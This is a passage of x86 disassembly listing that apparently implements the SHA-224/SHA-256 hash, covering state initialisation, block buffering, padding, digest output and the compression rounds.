  407cb9:	c7 40 1c 8c 68 05 9b 	movl   $0x9b05688c,0x1c(%eax)
  407cc0:	c7 40 20 ab d9 83 1f 	movl   $0x1f83d9ab,0x20(%eax)
  407cc7:	c7 40 24 19 cd e0 5b 	movl   $0x5be0cd19,0x24(%eax)
  407cce:	eb 38                	jmp    0x407d08
  407cd0:	c7 40 08 d8 9e 05 c1 	movl   $0xc1059ed8,0x8(%eax)
  407cd7:	c7 40 0c 07 d5 7c 36 	movl   $0x367cd507,0xc(%eax)
  407cde:	c7 40 10 17 dd 70 30 	movl   $0x3070dd17,0x10(%eax)
  407ce5:	c7 40 14 39 59 0e f7 	movl   $0xf70e5939,0x14(%eax)
  407cec:	c7 40 18 31 0b c0 ff 	movl   $0xffc00b31,0x18(%eax)
  407cf3:	c7 40 1c 11 15 58 68 	movl   $0x68581511,0x1c(%eax)
  407cfa:	c7 40 20 a7 8f f9 64 	movl   $0x64f98fa7,0x20(%eax)
  407d01:	c7 40 24 a4 4f fa be 	movl   $0xbefa4fa4,0x24(%eax)
  407d08:	89 48 68             	mov    %ecx,0x68(%eax)
  407d0b:	c2 08 00             	ret    $0x8
  407d0e:	56                   	push   %esi
  407d0f:	8b 74 24 10          	mov    0x10(%esp),%esi
  407d13:	85 f6                	test   %esi,%esi
  407d15:	0f 84 9b 00 00 00    	je     0x407db6
  407d1b:	53                   	push   %ebx
  407d1c:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  407d20:	55                   	push   %ebp
  407d21:	6a 40                	push   $0x40
  407d23:	59                   	pop    %ecx
  407d24:	8b 03                	mov    (%ebx),%eax
  407d26:	8b e8                	mov    %eax,%ebp
  407d28:	83 e5 3f             	and    $0x3f,%ebp
  407d2b:	03 c6                	add    %esi,%eax
  407d2d:	2b cd                	sub    %ebp,%ecx
  407d2f:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  407d33:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  407d37:	89 03                	mov    %eax,(%ebx)
  407d39:	3b c6                	cmp    %esi,%eax
  407d3b:	73 03                	jae    0x407d40
  407d3d:	ff 43 04             	incl   0x4(%ebx)
  407d40:	57                   	push   %edi
  407d41:	85 ed                	test   %ebp,%ebp
  407d43:	74 32                	je     0x407d77
  407d45:	3b f1                	cmp    %ecx,%esi
  407d47:	72 2e                	jb     0x407d77
  407d49:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407d4d:	8d 43 28             	lea    0x28(%ebx),%eax
  407d50:	51                   	push   %ecx
  407d51:	03 c5                	add    %ebp,%eax
  407d53:	57                   	push   %edi
  407d54:	50                   	push   %eax
  407d55:	e8 cb a8 ff ff       	call   0x402625
  407d5a:	83 c4 0c             	add    $0xc,%esp
  407d5d:	8d 43 28             	lea    0x28(%ebx),%eax
  407d60:	50                   	push   %eax
  407d61:	53                   	push   %ebx
  407d62:	e8 b6 01 00 00       	call   0x407f1d
  407d67:	03 7c 24 14          	add    0x14(%esp),%edi
  407d6b:	2b 74 24 14          	sub    0x14(%esp),%esi
  407d6f:	33 ed                	xor    %ebp,%ebp
  407d71:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  407d75:	eb 04                	jmp    0x407d7b
  407d77:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407d7b:	83 fe 40             	cmp    $0x40,%esi
  407d7e:	72 1f                	jb     0x407d9f
  407d80:	8b c6                	mov    %esi,%eax
  407d82:	c1 e8 06             	shr    $0x6,%eax
  407d85:	89 44 24 18          	mov    %eax,0x18(%esp)
  407d89:	8b e8                	mov    %eax,%ebp
  407d8b:	57                   	push   %edi
  407d8c:	53                   	push   %ebx
  407d8d:	e8 8b 01 00 00       	call   0x407f1d
  407d92:	83 c7 40             	add    $0x40,%edi
  407d95:	83 ee 40             	sub    $0x40,%esi
  407d98:	4d                   	dec    %ebp
  407d99:	75 f0                	jne    0x407d8b
  407d9b:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  407d9f:	85 f6                	test   %esi,%esi
  407da1:	74 10                	je     0x407db3
  407da3:	56                   	push   %esi
  407da4:	8d 43 28             	lea    0x28(%ebx),%eax
  407da7:	03 c5                	add    %ebp,%eax
  407da9:	57                   	push   %edi
  407daa:	50                   	push   %eax
  407dab:	e8 75 a8 ff ff       	call   0x402625
  407db0:	83 c4 0c             	add    $0xc,%esp
  407db3:	5f                   	pop    %edi
  407db4:	5d                   	pop    %ebp
  407db5:	5b                   	pop    %ebx
  407db6:	5e                   	pop    %esi
  407db7:	c2 0c 00             	ret    $0xc
  407dba:	55                   	push   %ebp
  407dbb:	8b ec                	mov    %esp,%ebp
  407dbd:	51                   	push   %ecx
  407dbe:	51                   	push   %ecx
  407dbf:	56                   	push   %esi
  407dc0:	8b 75 08             	mov    0x8(%ebp),%esi
  407dc3:	57                   	push   %edi
  407dc4:	6a 38                	push   $0x38
  407dc6:	8b 3e                	mov    (%esi),%edi
  407dc8:	8b c7                	mov    %edi,%eax
  407dca:	8b 4e 04             	mov    0x4(%esi),%ecx
  407dcd:	8b d7                	mov    %edi,%edx
  407dcf:	c1 e8 1d             	shr    $0x1d,%eax
  407dd2:	83 e7 3f             	and    $0x3f,%edi
  407dd5:	c1 e1 03             	shl    $0x3,%ecx
  407dd8:	0b c8                	or     %eax,%ecx
  407dda:	c1 e2 03             	shl    $0x3,%edx
  407ddd:	8b c1                	mov    %ecx,%eax
  407ddf:	88 4d fb             	mov    %cl,-0x5(%ebp)
  407de2:	c1 e8 18             	shr    $0x18,%eax
  407de5:	88 45 f8             	mov    %al,-0x8(%ebp)
  407de8:	8b c1                	mov    %ecx,%eax
  407dea:	c1 e8 10             	shr    $0x10,%eax
  407ded:	88 45 f9             	mov    %al,-0x7(%ebp)
  407df0:	8b c1                	mov    %ecx,%eax
  407df2:	c1 e8 08             	shr    $0x8,%eax
  407df5:	88 45 fa             	mov    %al,-0x6(%ebp)
  407df8:	8b c2                	mov    %edx,%eax
  407dfa:	c1 e8 18             	shr    $0x18,%eax
  407dfd:	88 45 fc             	mov    %al,-0x4(%ebp)
  407e00:	8b c2                	mov    %edx,%eax
  407e02:	c1 e8 10             	shr    $0x10,%eax
  407e05:	88 45 fd             	mov    %al,-0x3(%ebp)
  407e08:	8b c2                	mov    %edx,%eax
  407e0a:	c1 e8 08             	shr    $0x8,%eax
  407e0d:	88 45 fe             	mov    %al,-0x2(%ebp)
  407e10:	58                   	pop    %eax
  407e11:	88 55 ff             	mov    %dl,-0x1(%ebp)
  407e14:	3b f8                	cmp    %eax,%edi
  407e16:	72 03                	jb     0x407e1b
  407e18:	6a 78                	push   $0x78
  407e1a:	58                   	pop    %eax
  407e1b:	2b c7                	sub    %edi,%eax
  407e1d:	50                   	push   %eax
  407e1e:	68 a8 1f 40 00       	push   $0x401fa8
  407e23:	56                   	push   %esi
  407e24:	e8 e5 fe ff ff       	call   0x407d0e
  407e29:	6a 08                	push   $0x8
  407e2b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407e2e:	50                   	push   %eax
  407e2f:	56                   	push   %esi
  407e30:	e8 d9 fe ff ff       	call   0x407d0e
  407e35:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407e38:	8a 46 0b             	mov    0xb(%esi),%al
  407e3b:	88 01                	mov    %al,(%ecx)
  407e3d:	8a 46 0a             	mov    0xa(%esi),%al
  407e40:	88 41 01             	mov    %al,0x1(%ecx)
  407e43:	8b 46 08             	mov    0x8(%esi),%eax
  407e46:	c1 e8 08             	shr    $0x8,%eax
  407e49:	88 41 02             	mov    %al,0x2(%ecx)
  407e4c:	8a 46 08             	mov    0x8(%esi),%al
  407e4f:	88 41 03             	mov    %al,0x3(%ecx)
  407e52:	8a 46 0f             	mov    0xf(%esi),%al
  407e55:	88 41 04             	mov    %al,0x4(%ecx)
  407e58:	8a 46 0e             	mov    0xe(%esi),%al
  407e5b:	88 41 05             	mov    %al,0x5(%ecx)
  407e5e:	8b 46 0c             	mov    0xc(%esi),%eax
  407e61:	c1 e8 08             	shr    $0x8,%eax
  407e64:	88 41 06             	mov    %al,0x6(%ecx)
  407e67:	8a 46 0c             	mov    0xc(%esi),%al
  407e6a:	88 41 07             	mov    %al,0x7(%ecx)
  407e6d:	8a 46 13             	mov    0x13(%esi),%al
  407e70:	88 41 08             	mov    %al,0x8(%ecx)
  407e73:	8a 46 12             	mov    0x12(%esi),%al
  407e76:	88 41 09             	mov    %al,0x9(%ecx)
  407e79:	8b 46 10             	mov    0x10(%esi),%eax
  407e7c:	c1 e8 08             	shr    $0x8,%eax
  407e7f:	88 41 0a             	mov    %al,0xa(%ecx)
  407e82:	8a 46 10             	mov    0x10(%esi),%al
  407e85:	88 41 0b             	mov    %al,0xb(%ecx)
  407e88:	8a 46 17             	mov    0x17(%esi),%al
  407e8b:	88 41 0c             	mov    %al,0xc(%ecx)
  407e8e:	8a 46 16             	mov    0x16(%esi),%al
  407e91:	88 41 0d             	mov    %al,0xd(%ecx)
  407e94:	8b 46 14             	mov    0x14(%esi),%eax
  407e97:	c1 e8 08             	shr    $0x8,%eax
  407e9a:	88 41 0e             	mov    %al,0xe(%ecx)
  407e9d:	8a 46 14             	mov    0x14(%esi),%al
  407ea0:	88 41 0f             	mov    %al,0xf(%ecx)
  407ea3:	8a 46 1b             	mov    0x1b(%esi),%al
  407ea6:	88 41 10             	mov    %al,0x10(%ecx)
  407ea9:	8a 46 1a             	mov    0x1a(%esi),%al
  407eac:	88 41 11             	mov    %al,0x11(%ecx)
  407eaf:	8b 46 18             	mov    0x18(%esi),%eax
  407eb2:	c1 e8 08             	shr    $0x8,%eax
  407eb5:	88 41 12             	mov    %al,0x12(%ecx)
  407eb8:	8a 46 18             	mov    0x18(%esi),%al
  407ebb:	88 41 13             	mov    %al,0x13(%ecx)
  407ebe:	8a 46 1f             	mov    0x1f(%esi),%al
  407ec1:	88 41 14             	mov    %al,0x14(%ecx)
  407ec4:	8a 46 1e             	mov    0x1e(%esi),%al
  407ec7:	88 41 15             	mov    %al,0x15(%ecx)
  407eca:	8b 46 1c             	mov    0x1c(%esi),%eax
  407ecd:	c1 e8 08             	shr    $0x8,%eax
  407ed0:	88 41 16             	mov    %al,0x16(%ecx)
  407ed3:	8a 46 1c             	mov    0x1c(%esi),%al
  407ed6:	88 41 17             	mov    %al,0x17(%ecx)
  407ed9:	8a 46 23             	mov    0x23(%esi),%al
  407edc:	88 41 18             	mov    %al,0x18(%ecx)
  407edf:	8a 46 22             	mov    0x22(%esi),%al
  407ee2:	88 41 19             	mov    %al,0x19(%ecx)
  407ee5:	8b 46 20             	mov    0x20(%esi),%eax
  407ee8:	c1 e8 08             	shr    $0x8,%eax
  407eeb:	88 41 1a             	mov    %al,0x1a(%ecx)
  407eee:	8a 46 20             	mov    0x20(%esi),%al
  407ef1:	88 41 1b             	mov    %al,0x1b(%ecx)
  407ef4:	83 7e 68 00          	cmpl   $0x0,0x68(%esi)
  407ef8:	75 1b                	jne    0x407f15
  407efa:	8a 46 27             	mov    0x27(%esi),%al
  407efd:	88 41 1c             	mov    %al,0x1c(%ecx)
  407f00:	8a 46 26             	mov    0x26(%esi),%al
  407f03:	88 41 1d             	mov    %al,0x1d(%ecx)
  407f06:	8b 46 24             	mov    0x24(%esi),%eax
  407f09:	c1 e8 08             	shr    $0x8,%eax
  407f0c:	88 41 1e             	mov    %al,0x1e(%ecx)
  407f0f:	8a 46 24             	mov    0x24(%esi),%al
  407f12:	88 41 1f             	mov    %al,0x1f(%ecx)
  407f15:	5f                   	pop    %edi
  407f16:	5e                   	pop    %esi
  407f17:	8b e5                	mov    %ebp,%esp
  407f19:	5d                   	pop    %ebp
  407f1a:	c2 08 00             	ret    $0x8
  407f1d:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  407f23:	8b 94 24 54 01 00 00 	mov    0x154(%esp),%edx
  407f2a:	53                   	push   %ebx
  407f2b:	55                   	push   %ebp
  407f2c:	56                   	push   %esi
  407f2d:	8b b4 24 5c 01 00 00 	mov    0x15c(%esp),%esi
  407f34:	57                   	push   %edi
  407f35:	83 c6 08             	add    $0x8,%esi
  407f38:	8d 7c 24 38          	lea    0x38(%esp),%edi
  407f3c:	6a 08                	push   $0x8
  407f3e:	89 74 24 5c          	mov    %esi,0x5c(%esp)
  407f42:	59                   	pop    %ecx
  407f43:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407f45:	33 f6                	xor    %esi,%esi
  407f47:	83 c2 02             	add    $0x2,%edx
  407f4a:	8b fe                	mov    %esi,%edi
  407f4c:	0f b6 4a fe          	movzbl -0x2(%edx),%ecx
  407f50:	0f b6 42 ff          	movzbl -0x1(%edx),%eax
  407f54:	c1 e1 08             	shl    $0x8,%ecx
  407f57:	0b c8                	or     %eax,%ecx
  407f59:	0f b6 02             	movzbl (%edx),%eax
  407f5c:	c1 e1 08             	shl    $0x8,%ecx
  407f5f:	8d 52 04             	lea    0x4(%edx),%edx
  407f62:	0b c8                	or     %eax,%ecx
  407f64:	0f b6 42 fd          	movzbl -0x3(%edx),%eax
  407f68:	c1 e1 08             	shl    $0x8,%ecx
  407f6b:	0b c8                	or     %eax,%ecx
  407f6d:	89 4c bc 5c          	mov    %ecx,0x5c(%esp,%edi,4)
  407f71:	47                   	inc    %edi
  407f72:	83 ff 10             	cmp    $0x10,%edi
  407f75:	72 d5                	jb     0x407f4c
  407f77:	8b 44 24 40          	mov    0x40(%esp),%eax
  407f7b:	8b 7c 24 54          	mov    0x54(%esp),%edi
  407f7f:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  407f83:	8b 6c 24 4c          	mov    0x4c(%esp),%ebp
  407f87:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  407f8b:	89 44 24 14          	mov    %eax,0x14(%esp)
  407f8f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  407f93:	89 44 24 18          	mov    %eax,0x18(%esp)
  407f97:	8b 44 24 38          	mov    0x38(%esp),%eax
  407f9b:	89 74 24 20          	mov    %esi,0x20(%esp)
  407f9f:	8b 74 24 48          	mov    0x48(%esp),%esi
  407fa3:	c7 44 24 24 40 00 00 	movl   $0x40,0x24(%esp)
  407faa:	00 
  407fab:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  407faf:	eb 04                	jmp    0x407fb5
  407fb1:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407fb5:	8b d6                	mov    %esi,%edx
  407fb7:	8b c6                	mov    %esi,%eax
  407fb9:	c1 c0 07             	rol    $0x7,%eax
  407fbc:	c1 ca 0b             	ror    $0xb,%edx
  407fbf:	33 d0                	xor    %eax,%edx
  407fc1:	8b c6                	mov    %esi,%eax
  407fc3:	c1 c8 06             	ror    $0x6,%eax
  407fc6:	33 d0                	xor    %eax,%edx
  407fc8:	8b c5                	mov    %ebp,%eax
  407fca:	33 c3                	xor    %ebx,%eax
  407fcc:	23 c6                	and    %esi,%eax
  407fce:	33 c3                	xor    %ebx,%eax
  407fd0:	03 d0                	add    %eax,%edx
  407fd2:	8b 44 24 20          	mov    0x20(%esp),%eax
  407fd6:	03 90 a8 1e 40 00    	add    0x401ea8(%eax),%edx
  407fdc:	03 54 04 5c          	add    0x5c(%esp,%eax,1),%edx
  407fe0:	03 d7                	add    %edi,%edx
  407fe2:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  407fe6:	03 ca                	add    %edx,%ecx
  407fe8:	89 54 24 34          	mov    %edx,0x34(%esp)
  407fec:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  407ff0:	8b c7                	mov    %edi,%eax
  407ff2:	c1 c0 0a             	rol    $0xa,%eax
  407ff5:	8b cf                	mov    %edi,%ecx
  407ff7:	c1 c9 0d             	ror    $0xd,%ecx
  407ffa:	33 c8                	xor    %eax,%ecx
  407ffc:	8b c7                	mov    %edi,%eax
  407ffe:	c1 c8 02             	ror    $0x2,%eax
  408001:	33 c8                	xor    %eax,%ecx
  408003:	8b 44 24 18          	mov    0x18(%esp),%eax
  408007:	8b f8                	mov    %eax,%edi
  408009:	03 ca                	add    %edx,%ecx
  40800b:	23 44 24 1c          	and    0x1c(%esp),%eax
  40800f:	0b 7c 24 1c          	or     0x1c(%esp),%edi
  408013:	23 7c 24 14          	and    0x14(%esp),%edi
  408017:	0b f8                	or     %eax,%edi
  408019:	03 f9                	add    %ecx,%edi
  40801b:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40801f:	8b d1                	mov    %ecx,%edx
  408021:	8b c1                	mov    %ecx,%eax
  408023:	c1 c0 07             	rol    $0x7,%eax
  408026:	c1 ca 0b             	ror    $0xb,%edx
  408029:	33 d0                	xor    %eax,%edx
  40802b:	8b c1                	mov    %ecx,%eax
  40802d:	c1 c8 06             	ror    $0x6,%eax
  408030:	33 d0                	xor    %eax,%edx
  408032:	8b c5                	mov    %ebp,%eax
  408034:	33 c6                	xor    %esi,%eax
  408036:	23 c1                	and    %ecx,%eax
  408038:	8b cf                	mov    %edi,%ecx
  40803a:	33 c5                	xor    %ebp,%eax
  40803c:	c1 c9 0d             	ror    $0xd,%ecx
  40803f:	03 d0                	add    %eax,%edx
  408041:	8b 44 24 20          	mov    0x20(%esp),%eax
  408045:	03 90 ac 1e 40 00    	add    0x401eac(%eax),%edx
  40804b:	03 54 04 60          	add    0x60(%esp,%eax,1),%edx
  40804f:	8b c7                	mov    %edi,%eax
  408051:	c1 c0 0a             	rol    $0xa,%eax
  408054:	03 d3                	add    %ebx,%edx
  408056:	01 54 24 14          	add    %edx,0x14(%esp)
  40805a:	33 c8                	xor    %eax,%ecx
  40805c:	8b c7                	mov    %edi,%eax
  40805e:	c1 c8 02             	ror    $0x2,%eax
  408061:	33 c8                	xor    %eax,%ecx
  408063:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  408067:	8b d8                	mov    %eax,%ebx
  408069:	03 ca                	add    %edx,%ecx
  40806b:	0b df                	or     %edi,%ebx
  40806d:	23 c7                	and    %edi,%eax
  40806f:	23 5c 24 18          	and    0x18(%esp),%ebx
  408073:	0b d8                	or     %eax,%ebx
  408075:	03 d9                	add    %ecx,%ebx
  408077:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40807b:	8b d1                	mov    %ecx,%edx
  40807d:	8b c1                	mov    %ecx,%eax
  40807f:	c1 c0 07             	rol    $0x7,%eax
  408082:	c1 ca 0b             	ror    $0xb,%edx
  408085:	33 d0                	xor    %eax,%edx
  408087:	8b c1                	mov    %ecx,%eax
  408089:	c1 c8 06             	ror    $0x6,%eax
  40808c:	33 d0                	xor    %eax,%edx
  40808e:	8b 44 24 10          	mov    0x10(%esp),%eax
  408092:	33 c6                	xor    %esi,%eax
  408094:	23 c1                	and    %ecx,%eax
  408096:	8b cb                	mov    %ebx,%ecx
  408098:	33 c6                	xor    %esi,%eax
  40809a:	c1 c9 0d             	ror    $0xd,%ecx
  40809d:	03 d0                	add    %eax,%edx
  40809f:	8b 44 24 20          	mov    0x20(%esp),%eax
  4080a3:	03 90 b0 1e 40 00    	add    0x401eb0(%eax),%edx
  4080a9:	03 54 04 64          	add    0x64(%esp,%eax,1),%edx
  4080ad:	8b c3                	mov    %ebx,%eax
  4080af:	c1 c0 0a             	rol    $0xa,%eax
  4080b2:	03 d5                	add    %ebp,%edx
  4080b4:	01 54 24 18          	add    %edx,0x18(%esp)
  4080b8:	33 c8                	xor    %eax,%ecx
  4080ba:	8b c3                	mov    %ebx,%eax
  4080bc:	8b ef                	mov    %edi,%ebp
  4080be:	c1 c8 02             	ror    $0x2,%eax
  4080c1:	0b eb                	or     %ebx,%ebp
  4080c3:	33 c8                	xor    %eax,%ecx
  4080c5:	23 6c 24 1c          	and    0x1c(%esp),%ebp
  4080c9:	03 ca                	add    %edx,%ecx
  4080cb:	8b c7                	mov    %edi,%eax
  4080cd:	23 c3                	and    %ebx,%eax
  4080cf:	0b e8                	or     %eax,%ebp
  4080d1:	03 e9                	add    %ecx,%ebp
  4080d3:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4080d7:	8b d1                	mov    %ecx,%edx
  4080d9:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  4080dd:	c1 ca 0b             	ror    $0xb,%edx
  4080e0:	8b c1                	mov    %ecx,%eax
  4080e2:	c1 c0 07             	rol    $0x7,%eax
  4080e5:	33 d0                	xor    %eax,%edx
  4080e7:	8b c1                	mov    %ecx,%eax
  4080e9:	c1 c8 06             	ror    $0x6,%eax
  4080ec:	33 d0                	xor    %eax,%edx
  4080ee:	8b 44 24 14          	mov    0x14(%esp),%eax
  4080f2:	33 44 24 10          	xor    0x10(%esp),%eax
  4080f6:	23 c1                	and    %ecx,%eax
  4080f8:	8b cd                	mov    %ebp,%ecx
  4080fa:	33 44 24 10          	xor    0x10(%esp),%eax
  4080fe:	03 d0                	add    %eax,%edx
  408100:	c1 c9 0d             	ror    $0xd,%ecx
  408103:	8b 44 24 20          	mov    0x20(%esp),%eax
  408107:	03 90 b4 1e 40 00    	add    0x401eb4(%eax),%edx
  40810d:	03 54 04 68          	add    0x68(%esp,%eax,1),%edx
  408111:	8b c5                	mov    %ebp,%eax
  408113:	c1 c0 0a             	rol    $0xa,%eax
  408116:	03 d6                	add    %esi,%edx
  408118:	01 54 24 1c          	add    %edx,0x1c(%esp)
  40811c:	33 c8                	xor    %eax,%ecx
  40811e:	8b c5                	mov    %ebp,%eax
  408120:	8b f5                	mov    %ebp,%esi
  408122:	c1 c8 02             	ror    $0x2,%eax
  408125:	0b f3                	or     %ebx,%esi
  408127:	33 c8                	xor    %eax,%ecx
  408129:	23 f7                	and    %edi,%esi
  40812b:	03 ca                	add    %edx,%ecx
  40812d:	8b c5                	mov    %ebp,%eax
  40812f:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  408133:	23 c3                	and    %ebx,%eax
  408135:	0b f0                	or     %eax,%esi
  408137:	8b d5                	mov    %ebp,%edx
  408139:	c1 ca 0b             	ror    $0xb,%edx
  40813c:	8b c5                	mov    %ebp,%eax
  40813e:	c1 c0 07             	rol    $0x7,%eax
  408141:	03 f1                	add    %ecx,%esi
  408143:	33 d0                	xor    %eax,%edx
  408145:	8b c5                	mov    %ebp,%eax
  408147:	c1 c8 06             	ror    $0x6,%eax
  40814a:	33 d0                	xor    %eax,%edx
  40814c:	8b 44 24 14          	mov    0x14(%esp),%eax
  408150:	33 44 24 18          	xor    0x18(%esp),%eax
  408154:	23 c5                	and    %ebp,%eax
  408156:	33 44 24 14          	xor    0x14(%esp),%eax
  40815a:	03 d0                	add    %eax,%edx
  40815c:	8b 44 24 20          	mov    0x20(%esp),%eax
  408160:	03 90 b8 1e 40 00    	add    0x401eb8(%eax),%edx
  408166:	03 54 04 6c          	add    0x6c(%esp,%eax,1),%edx
  40816a:	03 54 24 10          	add    0x10(%esp),%edx
  40816e:	03 fa                	add    %edx,%edi
  408170:	8b ce                	mov    %esi,%ecx
  408172:	8b c6                	mov    %esi,%eax
  408174:	c1 c0 0a             	rol    $0xa,%eax
  408177:	c1 c9 0d             	ror    $0xd,%ecx
  40817a:	33 c8                	xor    %eax,%ecx
  40817c:	8b c6                	mov    %esi,%eax
  40817e:	c1 c8 02             	ror    $0x2,%eax
  408181:	33 c8                	xor    %eax,%ecx
  408183:	8b 44 24 28          	mov    0x28(%esp),%eax
  408187:	0b c6                	or     %esi,%eax
  408189:	03 ca                	add    %edx,%ecx
  40818b:	23 c3                	and    %ebx,%eax
  40818d:	8b d7                	mov    %edi,%edx
  40818f:	89 44 24 10          	mov    %eax,0x10(%esp)
  408193:	8b 44 24 28          	mov    0x28(%esp),%eax
  408197:	23 c6                	and    %esi,%eax
  408199:	c1 ca 0b             	ror    $0xb,%edx
  40819c:	09 44 24 10          	or     %eax,0x10(%esp)
  4081a0:	8b c7                	mov    %edi,%eax
  4081a2:	c1 c0 07             	rol    $0x7,%eax
  4081a5:	33 d0                	xor    %eax,%edx
  4081a7:	01 4c 24 10          	add    %ecx,0x10(%esp)
  4081ab:	8b c7                	mov    %edi,%eax
  4081ad:	c1 c8 06             	ror    $0x6,%eax
  4081b0:	33 d0                	xor    %eax,%edx
  4081b2:	8b 44 24 18          	mov    0x18(%esp),%eax
  4081b6:	33 c5                	xor    %ebp,%eax
  4081b8:	23 c7                	and    %edi,%eax
  4081ba:	33 44 24 18          	xor    0x18(%esp),%eax
  4081be:	03 d0                	add    %eax,%edx
  4081c0:	8b 44 24 20          	mov    0x20(%esp),%eax
  4081c4:	03 90 bc 1e 40 00    	add    0x401ebc(%eax),%edx
  4081ca:	03 54 04 70          	add    0x70(%esp,%eax,1),%edx
  4081ce:	8b 44 24 10          	mov    0x10(%esp),%eax
  4081d2:	8b c8                	mov    %eax,%ecx
  4081d4:	03 54 24 14          	add    0x14(%esp),%edx
  4081d8:	c1 c0 0a             	rol    $0xa,%eax
  4081db:	03 da                	add    %edx,%ebx
  4081dd:	c1 c9 0d             	ror    $0xd,%ecx
  4081e0:	33 c8                	xor    %eax,%ecx
  4081e2:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  4081e6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4081ea:	c1 c8 02             	ror    $0x2,%eax
  4081ed:	33 c8                	xor    %eax,%ecx
  4081ef:	8b 44 24 10          	mov    0x10(%esp),%eax
  4081f3:	8b e8                	mov    %eax,%ebp
  4081f5:	03 ca                	add    %edx,%ecx
  4081f7:	23 c6                	and    %esi,%eax
  4081f9:	0b ee                	or     %esi,%ebp
  4081fb:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4081ff:	8b d3                	mov    %ebx,%edx
  408201:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  408205:	21 6c 24 14          	and    %ebp,0x14(%esp)
  408209:	09 44 24 14          	or     %eax,0x14(%esp)
  40820d:	8b c3                	mov    %ebx,%eax
  40820f:	01 4c 24 14          	add    %ecx,0x14(%esp)
  408213:	c1 c0 07             	rol    $0x7,%eax
  408216:	c1 ca 0b             	ror    $0xb,%edx
  408219:	33 d0                	xor    %eax,%edx
  40821b:	8b c3                	mov    %ebx,%eax
  40821d:	c1 c8 06             	ror    $0x6,%eax
  408220:	33 d0                	xor    %eax,%edx
  408222:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  408226:	33 c7                	xor    %edi,%eax
  408228:	23 c3                	and    %ebx,%eax
  40822a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40822e:	33 44 24 1c          	xor    0x1c(%esp),%eax
  408232:	8b cb                	mov    %ebx,%ecx
  408234:	03 d0                	add    %eax,%edx
  408236:	c1 c9 0d             	ror    $0xd,%ecx
  408239:	8b 44 24 20          	mov    0x20(%esp),%eax
  40823d:	03 90 c0 1e 40 00    	add    0x401ec0(%eax),%edx
  408243:	03 54 04 74          	add    0x74(%esp,%eax,1),%edx
  408247:	8b c3                	mov    %ebx,%eax
  408249:	03 54 24 18          	add    0x18(%esp),%edx
  40824d:	c1 c0 0a             	rol    $0xa,%eax
  408250:	03 ea                	add    %edx,%ebp
  408252:	33 c8                	xor    %eax,%ecx
  408254:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  408258:	8b c3                	mov    %ebx,%eax
  40825a:	c1 c8 02             	ror    $0x2,%eax
  40825d:	33 c8                	xor    %eax,%ecx
  40825f:	8b c3                	mov    %ebx,%eax
  408261:	0b 44 24 10          	or     0x10(%esp),%eax
  408265:	03 ca                	add    %edx,%ecx
  408267:	23 c6                	and    %esi,%eax
  408269:	8b d5                	mov    %ebp,%edx
  40826b:	89 44 24 18          	mov    %eax,0x18(%esp)
  40826f:	8b c3                	mov    %ebx,%eax
  408271:	23 44 24 10          	and    0x10(%esp),%eax
  408275:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  408279:	0b d8                	or     %eax,%ebx
  40827b:	c1 ca 0b             	ror    $0xb,%edx
  40827e:	8b c5                	mov    %ebp,%eax
  408280:	03 d9                	add    %ecx,%ebx
  408282:	c1 c0 07             	rol    $0x7,%eax
  408285:	33 d0                	xor    %eax,%edx
  408287:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40828b:	8b c5                	mov    %ebp,%eax
  40828d:	c1 c8 06             	ror    $0x6,%eax
  408290:	33 d0                	xor    %eax,%edx
  408292:	8b c7                	mov    %edi,%eax
  408294:	33 44 24 2c          	xor    0x2c(%esp),%eax
  408298:	23 c5                	and    %ebp,%eax
  40829a:	33 c7                	xor    %edi,%eax
  40829c:	03 d0                	add    %eax,%edx
  40829e:	8b 44 24 20          	mov    0x20(%esp),%eax
  4082a2:	03 90 c4 1e 40 00    	add    0x401ec4(%eax),%edx
  4082a8:	03 54 04 78          	add    0x78(%esp,%eax,1),%edx
  4082ac:	8b c3                	mov    %ebx,%eax
  4082ae:	03 54 24 1c          	add    0x1c(%esp),%edx
  4082b2:	8b c8                	mov    %eax,%ecx
  4082b4:	c1 c0 0a             	rol    $0xa,%eax
  4082b7:	03 f2                	add    %edx,%esi
  4082b9:	c1 c9 0d             	ror    $0xd,%ecx
  4082bc:	33 c8                	xor    %eax,%ecx
  4082be:	8b c3                	mov    %ebx,%eax
  4082c0:	c1 c8 02             	ror    $0x2,%eax
  4082c3:	33 c8                	xor    %eax,%ecx
  4082c5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4082c9:	8b e8                	mov    %eax,%ebp
  4082cb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4082cf:	0b eb                	or     %ebx,%ebp
  4082d1:	23 c3                	and    %ebx,%eax
  4082d3:	23 6c 24 10          	and    0x10(%esp),%ebp
  4082d7:	03 ca                	add    %edx,%ecx
  4082d9:	8b dd                	mov    %ebp,%ebx
  4082db:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  4082df:	8b 6c 24 28          	mov    0x28(%esp),%ebp
